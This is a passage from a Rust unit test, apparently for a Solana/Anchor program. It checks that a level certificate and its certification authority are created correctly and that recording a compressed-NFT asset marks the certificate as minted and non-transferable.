        svm.send_transaction(tx).unwrap();

        let authority_account = svm
            .get_account(&certification_authority_pda)
            .expect("certification authority PDA should exist");
        let mut authority_data = authority_account.data.as_slice();
        let certification_authority =
            CertificationAuthority::try_deserialize(&mut authority_data)
                .expect("certification authority should deserialize");
        assert_eq!(certification_authority.authority, admin.pubkey());
        assert_eq!(certification_authority.bump, certification_authority_bump);

        let certificate_account = svm
            .get_account(&certificate_pda)
            .expect("certificate PDA should exist");
        let mut certificate_data = certificate_account.data.as_slice();
        let certificate = LevelCertificate::try_deserialize(&mut certificate_data)
            .expect("certificate should deserialize");
        assert_eq!(certificate.player, user.pubkey());
        assert_eq!(certificate.level, 0);
        assert_eq!(certificate.bump, certificate_bump);
        assert!(!certificate.minted);
        assert!(!certificate.transferable);
        assert_eq!(certificate.merkle_tree, Pubkey::default());
        assert_eq!(certificate.asset_id, Pubkey::default());
        assert_eq!(certificate.leaf_index, 0);
        assert_eq!(certificate.leaf_nonce, 0);

        let record_asset_ix = create_record_certificate_asset_ix(
            &admin.pubkey(),
            &certification_authority_pda,
            &certificate_pda,
            merkle_tree.pubkey(),
            asset_id.pubkey(),
            7,
            42,
        );
        let tx = Transaction::new_signed_with_payer(
            &[record_asset_ix],
            Some(&admin.pubkey()),
            &[&admin],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let updated_certificate_account = svm
            .get_account(&certificate_pda)
            .expect("certificate PDA should still exist");
        let mut updated_certificate_data = updated_certificate_account.data.as_slice();
        let updated_certificate = LevelCertificate::try_deserialize(&mut updated_certificate_data)
            .expect("updated certificate should deserialize");
        assert!(updated_certificate.minted);
        assert_eq!(updated_certificate.merkle_tree, merkle_tree.pubkey());
        assert_eq!(updated_certificate.asset_id, asset_id.pubkey());
        assert_eq!(updated_certificate.leaf_index, 7);
        assert_eq!(updated_certificate.leaf_nonce, 42);
        assert!(updated_certificate.minted_at >= certificate.claimed_at);
        assert!(!updated_certificate.transferable);
    }
}
